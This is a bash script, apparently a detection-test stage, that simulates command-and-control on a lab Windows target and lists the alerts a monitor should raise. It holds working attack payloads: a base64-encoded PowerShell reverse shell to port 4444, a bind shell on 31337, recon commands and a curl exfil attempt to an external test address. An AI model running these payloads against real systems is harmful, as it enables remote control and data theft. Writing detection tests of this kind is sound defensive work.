#!/usr/bin/env bash
# Stage 6 — command and control: encoded PowerShell reverse shell, a bind
# shell on a suspicious port, outbound recon from the box, and an exfil
# attempt to an external host.
set -euo pipefail
. "$(dirname "$0")/lib.sh"

need nc "netcat (nc)"
need python3 "EncodedCommand helper"

check_target

say "reverse shell — encoded PowerShell TCP client (listener on $HOST_IP:4444)"
LOG=$(mktemp)
nc -l 4444 >"$LOG" 2>/dev/null &
LISTENER=$!
sleep 1
# start /b so ping.asp does not wait on the client.
rce "start /b powershell -nop -enc $(ps_enc "\$c=New-Object Net.Sockets.TCPClient('$HOST_IP',4444);\$s=\$c.GetStream();\$b=[text.encoding]::ASCII.GetBytes('win01 pwned');\$s.Write(\$b,0,\$b.Length);\$c.Close()")"
sleep 3
kill "$LISTENER" 2>/dev/null || true
echo "---- listener caught: -------------------------------------------"
cat "$LOG"
rm -f "$LOG"

say "bind shell — PowerShell listener on the target (port 31337)"
rce "start /b powershell -nop -enc $(ps_enc "\$l=[Net.Sockets.TcpListener]31337;\$l.Start();\$c=\$l.AcceptTcpClient();\$s=\$c.GetStream();\$b=[text.encoding]::ASCII.GetBytes((whoami));\$s.Write(\$b,0,\$b.Length);\$l.Stop()")"
sleep 2
printf 'whoami\n' | nc -w 3 "$TARGET" 31337 || note "no reply from the bind shell"

say "outbound recon from the compromised box"
rce 'net user' | strip
rce "curl.exe -m 5 -s http://$HOST_IP/" | strip || true

say "exfil attempt to an external host (203.0.113.66, TEST-NET)"
rce 'curl.exe -m 5 -s http://203.0.113.66/x' | strip || true

note "expected on the target:"
note "  process HIGH    ps-enc — EncodedCommand for the reverse and bind shells"
note "  network CRITICAL connection to suspicious port — the shell dials"
note "                   home to 4444, which elmer distrusts"
note "  network HIGH    socket bound to suspicious port (31337)"
note "  process LOW     recon-whoami-priv — net user"
note "  network         outbound to 203.0.113.66 flagged external"
